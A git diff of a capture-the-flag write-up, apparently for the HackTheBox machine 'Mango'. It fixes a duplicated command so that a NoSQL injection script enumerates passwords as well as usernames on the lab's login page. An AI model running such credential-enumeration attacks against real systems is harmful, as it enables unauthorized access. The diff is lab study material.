@@ -35,7 +35,7 @@ We can enumerate users and password with [this script](https://github.com/an0nlk
 ```
 python3 nosqli-user-pass-enum.py -u http://staging-order.mango.htb -up username -pp password -ep username -op login=login -m POST
 
-python3 nosqli-user-pass-enum.py -u http://staging-order.mango.htb -up username -pp password -ep username -op login=login -m POST
+python3 nosqli-user-pass-enum.py -u http://staging-order.mango.htb -up username -pp password -ep password -op login=login -m POST
 ```
 
 ![usernameEnumeration](https://github.com/b1d0ws/OSCP/assets/58514930/241c94db-e782-4fbd-8869-91c317e10d35)
